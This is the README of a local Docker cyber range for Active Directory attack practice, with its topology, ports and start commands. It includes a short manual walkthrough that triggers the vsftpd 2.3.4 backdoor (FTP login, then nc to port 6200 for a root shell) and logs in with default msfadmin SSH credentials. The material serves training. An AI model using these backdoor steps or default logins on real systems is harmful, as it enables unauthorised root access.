# Range AD-Mini (Cyber Range)

Local vulnerable Active Directory practice range. Fully isolated Docker
bridge network with DHCP-assigned addresses, simulated users, and fake
background traffic. No fixed subnet, so it never collides with existing
Docker networks.

## Topology

| Host | Role |
|------|------|
| dc | Samba AD DC (SMB/LDAP/Kerberos, `instantlinux/samba-dc`) |
| ws01 | Vulnerable workstation (implant target) |
| traffic-gen | Fake logon/probe generator |

`lab range start ad-mini` prints the discovered ws01 IP for
`assign rhost`. Hosts also resolve each other by name (`dc`, `ws01`).

## Prove it is exploitable

```bash
lab range verify ad-mini   # fires vsftpd 2.3.4 backdoor, expects uid=0(root)
```

Manual walkthrough against ws01 from the host:

```bash
ftp 127.0.0.1 2121            # USER backdoor:)  PASS anything
nc 127.0.0.1 6200             # root shell
id                            # uid=0(root)
ssh -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no msfadmin@127.0.0.1  # pass msfadmin
```

The legacy OpenSSH on ws01 only offers `ssh-rsa`, which modern clients
reject by default; the `-o HostKeyAlgorithms` flag re-enables it. With the
range IP use native ports instead: `ssh msfadmin@<ws01-ip>`.

Exiting the LazyOwn shell (Ctrl-D, `quit`, `qa`, `exit`) stops the range,
the redirectors, and stray `cloudflared` processes automatically.

These are the intentionally vulnerable defaults of the training images,
valid only inside this disposable lab.

First boot provisions the domain and takes a few minutes. `lab range start`
generates a random per-deployment Administrator password into
`secrets/samba-admin-password.txt` (gitignored, never committed) and prints
it for practice. Manual compose users: create that file first with any
password.

The DC runs `privileged: true` because Samba AD provisioning must set NT
ACLs on sysvol, which fails unprivileged (`NT_STATUS_ACCESS_DENIED`).
This is a local training range only; never reuse this compose for other
workloads.

From the Kali host, reach ws01 through published ports, not internal IPs:

| Service | Host port | Container |
|---------|-----------|-----------|
| SSH | 2222 | ws01:22 |
| FTP (vsftpd backdoor practice) | 2121 | ws01:21 |
| Telnet | 2323 | ws01:23 |
| NetBIOS/SMB | 1139 / 1445 | ws01:139/445 |
| HTTP | 8081 | ws01:80 |
| LDAP (DC) | 389 | dc:389 |
| DC SMB | 1446 | dc:445 |

## Usage

```bash
lab range start ad-mini
lab range stop ad-mini
gym start first_implant
gym start lateral_ad
gym start vault_exfil
```
